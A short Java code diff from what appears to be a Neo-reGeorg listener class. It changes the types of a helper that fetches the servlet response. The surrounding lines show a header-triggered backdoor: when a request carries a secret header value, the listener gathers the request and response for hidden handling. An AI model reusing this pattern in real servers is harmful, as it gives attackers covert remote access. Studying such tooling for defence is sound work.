@@ -70,7 +70,7 @@ public class NeoreGeorgListener extends ClassLoader implements ServletRequestLis
         try {
             if (request.getHeader(headerName) != null
                     && request.getHeader(headerName).contains(headerValue)) {
-                HttpServletResponse response = this.getResponseFromRequest(request);
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                 Object[] args = new Object[]{
                         request,
                         response,
@@ -97,7 +97,7 @@ public class NeoreGeorgListener extends ClassLoader implements ServletRequestLis
         }
     }
 
-    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
+    private Object getResponseFromRequest(Object request) throws Exception {
         return null;
     }
 }
